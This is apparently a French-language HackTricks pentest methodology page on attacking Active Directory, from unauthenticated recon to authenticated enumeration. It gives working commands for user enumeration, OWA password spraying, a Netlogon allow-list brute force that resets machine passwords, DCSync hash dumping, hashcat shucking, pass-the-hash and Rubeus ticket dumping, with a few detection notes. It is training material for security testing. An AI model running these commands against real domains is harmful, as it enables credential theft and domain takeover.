# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Vue d’ensemble

**Active Directory** est une technologie fondamentale permettant aux **administrateurs réseau** de créer et de gérer efficacement les **domaines**, les **utilisateurs** et les **objets** au sein d’un réseau. Il est conçu pour évoluer et faciliter l’organisation d’un grand nombre d’utilisateurs en **groupes** et **sous-groupes** gérables, tout en contrôlant les **droits d’accès** à différents niveaux.

La structure d’**Active Directory** se compose de trois couches principales : les **domaines**, les **arbres** et les **forêts**. Un **domaine** regroupe des objets, tels que des **utilisateurs** ou des **appareils**, partageant une base de données commune. Les **arbres** sont des groupes de domaines reliés par une structure commune, tandis qu’une **forêt** représente un ensemble de plusieurs arbres interconnectés par des **relations d’approbation**, formant le niveau supérieur de la structure organisationnelle. Des **droits d’accès** et de **communication** spécifiques peuvent être définis à chacun de ces niveaux.

Les concepts clés d’**Active Directory** comprennent :

1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
2. **Object** – Désigne les entités présentes dans l’annuaire, notamment les **utilisateurs**, les **groupes** ou les **dossiers partagés**.
3. **Domain** – Sert de conteneur pour les objets de l’annuaire. Plusieurs domaines peuvent coexister au sein d’une **forêt**, chacun conservant sa propre collection d’objets.
4. **Tree** – Regroupe des domaines partageant un domaine racine commun.
5. **Forest** – Représente le sommet de la structure organisationnelle d’Active Directory. Elle se compose de plusieurs arbres entre lesquels existent des **relations d’approbation**.

**Active Directory Domain Services (AD DS)** comprend un ensemble de services essentiels à la gestion centralisée et à la communication au sein d’un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **utilisateurs** et les **domaines**, notamment les fonctionnalités d’**authentification** et de **recherche**.
2. **Certificate Services** – Gère la création, la distribution et la gestion des **certificats numériques** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications compatibles avec les annuaires via le **protocole LDAP**.
4. **Directory Federation Services** – Fournit des fonctionnalités de **single sign-on** pour authentifier les utilisateurs sur plusieurs applications web au cours d’une même session.
5. **Rights Management** – Contribue à protéger les contenus protégés par le droit d’auteur en régulant leur distribution et leur utilisation non autorisées.
6. **DNS Service** – Est essentiel à la résolution des **noms de domaine**.

Pour une explication plus détaillée, consultez : [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Pour apprendre à **attaquer un AD**, vous devez très bien **comprendre** le **processus d’authentification Kerberos**.\
[**Lisez cette page si vous ne savez toujours pas comment il fonctionne.**](kerberos-authentication.md)

## Cheat Sheet

Vous pouvez consulter [https://wadcoms.github.io/](https://wadcoms.github.io) pour avoir un aperçu rapide des commandes que vous pouvez exécuter afin d’enumerate/exploit un AD.

> [!WARNING]
> La communication Kerberos **nécessite normalement un nom de domaine complet (FQDN)** afin que le client puisse obtenir un ticket pour le SPN approprié. L’accès à une machine via son adresse IP bascule généralement vers NTLM au lieu de Kerberos.

## Recon Active Directory (No creds/sessions)

Si vous avez uniquement accès à un environnement AD, sans disposer de credentials/sessions, vous pouvez :

- **Pentest the network:**
- Scanner le réseau, trouver les machines et les ports ouverts, puis tenter d’**exploit des vulnerabilities** ou d’**extraire des credentials** de ces machines (par exemple, [les imprimantes peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
- Enumerate le DNS peut fournir des informations sur les serveurs clés du domaine, tels que le web, les imprimantes, les shares, le VPN, les médias, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consultez la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) générale pour plus d’informations sur la manière de procéder.
- **Check for null and Guest access on smb services** (cela ne fonctionnera pas sur les versions modernes de Windows) :
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Un guide plus détaillé sur la manière d’enumerate un serveur SMB est disponible ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Un guide plus détaillé sur la manière d’enumerate LDAP est disponible ici (faites particulièrement **attention à l’accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Collecter des credentials en [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accéder à un hôte en [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Collecter des credentials en **exposant** de [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
- Extraire les noms d’utilisateur/noms à partir de documents internes, des réseaux sociaux et des services (principalement web) présents dans les environnements du domaine, ainsi que des sources accessibles au public.
- Si vous trouvez les noms complets des employés d’une entreprise, vous pouvez essayer différentes **conventions de noms d’utilisateur AD (**[**lisez ceci**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Outils :
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum** : Lorsqu’un **nom d’utilisateur invalide est demandé**, le serveur répond avec le code d’erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui permet de déterminer que le nom d’utilisateur est invalide. Les **noms d’utilisateur valides** provoquent soit la réception du **TGT** dans une réponse AS-REP, soit l’erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l’utilisateur doit effectuer une pré-authentification.
- **No Authentication against MS-NRPC** : Utilisation de auth-level = 1 (No authentication) contre l’interface MS-NRPC (Netlogon) des contrôleurs de domaine. La méthode appelle la fonction `DsrGetDcNameEx2` après avoir effectué le binding de l’interface MS-NRPC afin de vérifier si l’utilisateur ou l’ordinateur existe sans credentials. L’outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d’enumeration. La recherche est disponible [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Serveur OWA (Outlook Web Access)**

Si vous avez trouvé l’un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération des utilisateurs sur celui-ci**. Par exemple, vous pouvez utiliser l’outil [**MailSniper**](https://github.com/dafthack/MailSniper) :
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Vous pouvez trouver des listes de noms d'utilisateur dans [**ce dépôt github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez disposer des **noms des personnes travaillant dans l'entreprise** grâce à l'étape de recon que vous auriez dû effectuer auparavant. Avec le prénom et le nom, vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiellement valides.

### Abus de la allow-list du canal vulnérable Netlogon (Onelogon)

Même après l'application du correctif **Zerologon** sur le DC, les comptes explicitement autorisés dans la allow-list peuvent toujours être exposés au comportement **legacy/vulnerable du secure channel Netlogon**. La configuration risquée est la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou la valeur de registre correspondante **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Cette valeur est un **descripteur de sécurité SDDL** (voir [Security Descriptors](security-descriptors.md)). Tout compte ou groupe bénéficiant de l'ACE correspondante dans la DACL peut être ciblé. Par exemple, `O:BAG:BAD:(A;;RC;;;WD)` autorise effectivement **Everyone** dans la allow-list.

Workflow pratique pour l'opérateur :

1. **Identifier les principaux autorisés dans la allow-list** en vérifiant à la fois **SYSVOL/GPO** et le registre du **DC en production**.
2. **Résoudre les SID** trouvés dans le SDDL en utilisateurs/ordinateurs AD réels et donner la priorité aux **comptes de machine des DC**, aux **comptes de trust** et aux autres machines privilégiées.
3. Tenter de manière répétée l'**authentification MS-NRPC / Netlogon** avec le compte autorisé dans la allow-list.
4. Après une supposition réussie, abuser de la **configuration du mot de passe Netlogon** pour réinitialiser le mot de passe du compte ciblé (le PoC public le définit sur une chaîne vide).<sup>[[9]](#references)[[10]](#references)</sup>

Exemples rapides de triage / lab provenant de l'artefact public :
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes :

- Le **scanner** est utile, car l'allow-list effective peut se trouver dans **SYSVOL**, dans le **registry**, ou dans les deux.
- Le chemin d'exploitation lui-même est important, car il **ne nécessite pas de privilèges Domain Admin** une fois qu'un compte vulnérable a été identifié.
- La compromission d'un **compte machine de Domain Controller**, tel que `DC$`, est particulièrement dangereuse, car la réinitialisation de ce mot de passe peut directement permettre des chemins plus larges de **prise de contrôle de l'AD**.
- La faisabilité du **brute force** dépend du mode : l'artifact public décrit une approche meet-in-the-middle, un **brute force de 24 bits** lorsqu'un autre compte machine est disponible, ainsi que des variantes **32 bits** plus lentes.

Notes sur la détection et le hardening :

- Auditez la policy d'allow-list et supprimez tout élément, à l'exception des exceptions temporaires de compatibilité explicitement requises.
- Surveillez les événements **System** des DC **5827/5828/5829/5830/5831** afin de détecter les connexions Netlogon vulnérables refusées, découvertes ou explicitement autorisées par la policy.
- Considérez les comptes présents dans `VulnerableChannelAllowList` comme présentant un **risque élevé** jusqu'à la suppression de la dépendance legacy.

### Connaître un ou plusieurs usernames

D'accord, vous savez donc que vous disposez déjà d'un username valide, mais d'aucun mot de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md) : Si un utilisateur **ne possède pas** l'attribut _DONT_REQ_PREAUTH_, vous pouvez **demander un message AS_REP** pour cet utilisateur, qui contiendra des données chiffrées à partir d'une dérivation du mot de passe de l'utilisateur.
- [**Password Spraying**](password-spraying.md) : Essayons les mots de passe les plus **courants** avec chacun des utilisateurs découverts ; l'un d'eux utilise peut-être un mauvais mot de passe (tenez compte de la password policy !).
- Notez que vous pouvez également effectuer du **spray sur les serveurs OWA** afin d'essayer d'accéder aux serveurs de messagerie des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### Empoisonnement LLMNR/NBT-NS

Vous pourriez être en mesure d'**obtenir** des **hashes** de challenge en effectuant du **poisoning** sur certains protocoles du **réseau** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

L'énumération Active Directory fournit des usernames, des identifiants email et des conventions de nommage, des hôtes candidats ainsi que des services susceptibles d'être contraints à s'authentifier. Utilisez ce contexte pour identifier les [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM viables et les chemins potentiels vers l'environnement AD.

### Reconnaissance pilotée par les workspaces NetExec et vérifications de la posture de relay

- Utilisez les **workspaces `nxcdb`** pour conserver l'état de la reconnaissance AD par engagement : `workspace create <name>` génère des bases SQLite par protocole sous `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Changez de vue avec `proto smb|mssql|winrm` et listez les secrets collectés avec `creds`. Supprimez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- La découverte rapide d'un subnet avec **`netexec smb <cidr>`** révèle le **domain**, le **build de l'OS**, les **exigences de signature SMB** et le **Null Auth**. Les membres affichant `(signing:False)` sont **exposés au relay**, tandis que les DC exigent souvent la signature.
- Générez directement des **hostnames dans /etc/hosts** à partir de la sortie de NetExec afin de faciliter le ciblage :
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Lorsque le **SMB relay vers le DC est bloqué** par la signature, vérifiez tout de même la configuration de **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / une liaison de canal faible. Un DC exigeant la signature SMB, mais dont la signature LDAP est désactivée, reste une cible viable pour un **relay-to-LDAP**, notamment pour des abus tels que le **SPN-less RBCD**.

### Fuites d’identifiants via les imprimantes → validation en masse des identifiants du domaine

- Les interfaces web des imprimantes intègrent parfois des **mots de passe administrateur masqués dans le HTML**. L’affichage du code source ou l’utilisation des outils de développement peut révéler le texte en clair (par exemple, `<input value="<password>">`), permettant un accès Basic-auth aux référentiels de numérisation et d’impression.
- Les travaux d’impression récupérés peuvent contenir des **documents d’intégration en texte clair** avec les mots de passe propres à chaque utilisateur. Conservez les associations lors des tests :<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PC ou partages** avec l'utilisateur **null ou guest**, vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont consultés d'une manière ou d'une autre, **déclencheront une authentification NTLM contre vous**, ce qui vous permettra de **voler** le **challenge NTLM** afin de le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Le **hash shucking** traite chaque hash NT que vous possédez déjà comme un mot de passe candidat pour d'autres formats plus lents dont le matériel de clé est dérivé directement du hash NT. Au lieu de brute-forcer de longues passphrases dans des tickets Kerberos RC4, des challenges NetNTLM ou des credentials mis en cache, vous fournissez les hashes NT aux modes NT-candidate de Hashcat et le laissez valider la réutilisation du mot de passe sans jamais connaître le plaintext. Cette technique est particulièrement efficace après une compromission de domaine, lorsque vous pouvez récupérer des milliers de hashes NT actuels et historiques.<sup>[[5]](#references)</sup>

Utilisez le shucking lorsque :

- Vous disposez d'un corpus NT provenant de DCSync, de dumps SAM/SECURITY ou de credential vaults et que vous devez tester leur réutilisation dans d'autres domaines/forêts.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM ou des blobs DCC/DCC2.
- Vous voulez prouver rapidement la réutilisation de passphrases longues et impossibles à cracker, puis pivoter immédiatement via Pass-the-Hash.

La technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas le hash NT (par exemple, les types Kerberos 17/18 AES). Si un domaine impose l'utilisation exclusive d'AES, vous devez revenir aux modes de mot de passe classiques.

#### Création d'un corpus de hashes NT

- **DCSync/NTDS** – Utilisez `secretsdump.py` avec l'historique pour récupérer le plus grand ensemble possible de hashes NT (ainsi que leurs valeurs précédentes) :

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Les entrées historiques élargissent considérablement le pool de candidats, car Microsoft peut stocker jusqu'à 24 hashes précédents par compte. Pour découvrir d'autres moyens de récupérer des secrets NTDS, consultez :

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données SAM/SECURITY locales et les ouvertures de session de domaine mises en cache (DCC/DCC2). Dédupliquez ces hashes et ajoutez-les à la même liste `nt_candidates.txt`.
- **Suivez les métadonnées** – Conservez le nom d'utilisateur/domaine à l'origine de chaque hash (même si la wordlist ne contient que des valeurs hexadécimales). Les hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe lorsque Hashcat affiche le candidat gagnant.
- Préférez les candidats provenant de la même forêt ou d'une forêt approuvée ; cela maximise les chances de chevauchement lors du shucking.

#### Modes NT-candidate de Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Remarques :

- Les entrées NT-candidate **doivent rester des hashes NT bruts de 32 caractères hexadécimaux**. Désactivez les rule engines (pas de `-r` ni de modes hybrides), car la modification corrompt le matériel de clé candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l'espace de clés NTLM (~30 000 MH/s sur un M3 Max) est environ 100 fois plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT ciblée est bien moins coûteux que d'explorer tout l'espace des mots de passe dans le format lent.
- Utilisez toujours la **dernière build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), car les modes 31500/31600/35300 ont été ajoutés récemment.<sup>[[7]](#references)</sup>
- Il n'existe actuellement aucun mode NT pour AS-REQ Pre-Auth, et les types AES (19600/19700) nécessitent le plaintext du mot de passe, car leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, et non de hashes NT bruts.

#### Exemple – Kerberoast RC4 (mode 35300)

1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur disposant de faibles privilèges (consultez la page Kerberoast pour plus de détails) :

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Effectuez le shucking du ticket avec votre liste NT :

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat dérive la clé RC4 à partir de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l'un de vos hashes NT existants.

3. Pivotez immédiatement via PtH :

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Vous pouvez récupérer le plaintext ultérieurement avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Exemple – Credentials mis en cache (mode 31600)

1. Dump les ouvertures de session mises en cache depuis une workstation compromise :

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copiez la ligne DCC2 de l'utilisateur de domaine intéressant dans `dcc2_highpriv.txt`, puis effectuez le shucking :

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Une correspondance réussie fournit le hash NT déjà connu dans votre liste, ce qui prouve que l'utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour le PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le dans le mode NTLM rapide pour récupérer la chaîne.

Le même workflow s'applique aux challenge-responses NetNTLM (`-m 27000/27100`) et au DCC (`-m 31500`). Une fois une correspondance identifiée, vous pouvez lancer un relay, un PtH SMB/WMI/WinRM ou re-cracker le hash NT avec des masks/rules offline.



## Énumération d'Active Directory AVEC des credentials/session

Pour cette phase, vous devez avoir **compromis les credentials ou une session d'un compte de domaine valide**. Si vous disposez de credentials valides ou d'un shell en tant qu'utilisateur de domaine, **vous devez vous rappeler que les options présentées précédemment restent disponibles pour compromettre d'autres utilisateurs**.

Avant de commencer l'énumération authentifiée, comprenez le **problème du double-hop Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Énumération

La compromission d'un compte constitue une **étape majeure dans l'évaluation du domaine**, car elle permet une **énumération authentifiée d'Active Directory** :

Concernant [**ASREPRoast**](asreproast.md), vous pouvez désormais trouver tous les utilisateurs potentiellement vulnérables et, concernant le [**Password Spraying**](password-spraying.md), vous pouvez obtenir une **liste de tous les noms d'utilisateur** et essayer le mot de passe du compte compromis, les mots de passe vides ainsi que les nouveaux mots de passe prometteurs.

- Vous pouvez utiliser le [**CMD pour effectuer une reconnaissance de base**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez également utiliser [**powershell pour la reconnaissance**](../basic-powershell-for-pentesters/index.html), ce qui sera plus furtif
- Vous pouvez aussi [**utiliser powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil remarquable pour la reconnaissance dans un active directory est [**BloodHound**](bloodhound.md). Il est **peu furtif** (selon les méthodes de collecte utilisées), mais **si cela ne vous préoccupe pas**, vous devriez vraiment l'essayer. Trouvez où les utilisateurs peuvent se connecter en RDP, trouvez un chemin vers d'autres groupes, etc.
- **Les autres outils automatisés d'énumération AD sont :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Les enregistrements DNS de l'AD**](ad-dns-records.md), car ils peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer le répertoire est **AdExplorer.exe**, fourni avec la suite **SysInternal**.
- Vous pouvez également effectuer des recherches dans la base LDAP avec **ldapsearch** afin de rechercher des credentials dans les champs _userPassword_ et _unixUserPassword_, ou même dans _Description_. Consultez [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
- Si vous utilisez **Linux**, vous pouvez également énumérer le domaine avec [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez aussi essayer des outils automatisés tels que :
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraction de tous les utilisateurs du domaine**

Il est très facile d'obtenir tous les noms d'utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section consacrée à l'énumération semble courte, il s'agit de la partie la plus importante de l'ensemble. Consultez les liens (principalement ceux concernant cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu'à vous sentir à l'aise. Lors d'une évaluation, ce sera le moment clé pour trouver votre chemin vers DA ou décider que rien ne peut être fait.

### Comptes d'ordinateur précréés prévisibles -> accès au mot de passe gMSA

Les comptes d'ordinateur préparés pour les jointures legacy peuvent conserver un mot de passe initial prévisible. Le module `pre2k` de NetExec identifie la valeur caractéristique `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) et tente d'obtenir un TGT Kerberos avec les 14 premiers caractères du nom d'ordinateur en minuscules, sans le `$` final. Considérez cette valeur UAC comme un sélecteur de candidats plutôt que de supposer que l'appartenance à **Pre-Windows 2000 Compatible Access** prouve à elle seule que le mot de passe est faible.<sup>[[18]](#references)[[20]](#references)</sup>

Utilisez une énumération LDAP authentifiée pour tester les candidats et enregistrer les TGT réussis. `ALL=True` étend les tests au-delà des objets correspondant au filtre `4128` par défaut.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
Un bind par défaut/NTLM échoué **n'invalide pas** cette constatation : testez avec `-k`, un FQDN qui se résout vers le DC et une horloge synchronisée avec le KDC. Les exécutions réussies du module écrivent les listes de candidats et les ccaches obtenus dans `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Après avoir compromis le computer principal, cartographiez ses appartenances imbriquées à des groupes et ses droits sortants. En particulier, les principals nommés dans le descripteur de sécurité `msDS-GroupMSAMembership` d'un gMSA peuvent lire `msDS-ManagedPassword` ; la sortie `--gmsa` de NetExec affiche les principals autorisés et renvoie le hash NT actuel lorsque le computer qui s'authentifie est autorisé.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Évaluez ensuite le gMSA récupéré comme n’importe quel autre credential : examinez l’appartenance aux groupes locaux/de domaine, les droits de logon, les SPN, la délégation et les services accessibles avant d’essayer le pass-the-hash. Ce chemin de récupération basé sur les ACL est distinct de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), qui dérive les mots de passe gérés après la compromission de la clé racine KDS.<sup>[[20]](#references)</sup>

### Kerberoast

Le Kerberoasting consiste à obtenir des **tickets TGS** utilisés par des services associés à des comptes utilisateur et à casser leur chiffrement — qui repose sur les mots de passe utilisateur — **offline**.

Plus d’informations à ce sujet :

{{#ref}}
kerberoast.md
{{#endref}}

### Connexion à distance (RDP, SSH, FTP, Win-RM, etc.)

Une fois que vous avez obtenu des credentials, vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** afin de tenter de vous connecter à plusieurs serveurs avec différents protocoles, en fonction de vos scans de ports.

### Local Privilege Escalation

Si vous avez compromis des credentials ou disposez d’une session en tant qu’utilisateur de domaine standard et pouvez accéder à **n’importe quelle machine du domaine**, recherchez un moyen d’**escalader les privilèges localement et de collecter des credentials**. Les privilèges d’administrateur local peuvent vous permettre de **dump les hashes d’autres utilisateurs** depuis la mémoire (LSASS) et le stockage local (SAM).

Ce livre contient une page complète sur la [**local privilege escalation sous Windows**](../windows-local-privilege-escalation/index.html) ainsi qu’une [**checklist**](../checklist-windows-privilege-escalation.md). N’oubliez pas non plus d’utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la session actuelle

Il est très **peu probable** que vous trouviez des **tickets** dans l’utilisateur actuel **vous permettant d’accéder** à des ressources inattendues, mais vous pouvez vérifier :
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Avec des identifiants de domaine ou une session utilisateur, réexaminez les [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM : les techniques d'énumération authentifiée et de coercition peuvent révéler des chemins de relay qui n'étaient pas disponibles lors de la reconnaissance non authentifiée.

### Recherche de Creds dans les partages d'ordinateurs | Partages SMB

Maintenant que vous disposez de quelques identifiants de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés au sein de l'AD**. Vous pourriez le faire manuellement, mais il s'agit d'une tâche très répétitive et ennuyeuse (d'autant plus si vous trouvez des centaines de documents à vérifier).

[**Suivez ce lien pour découvrir les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

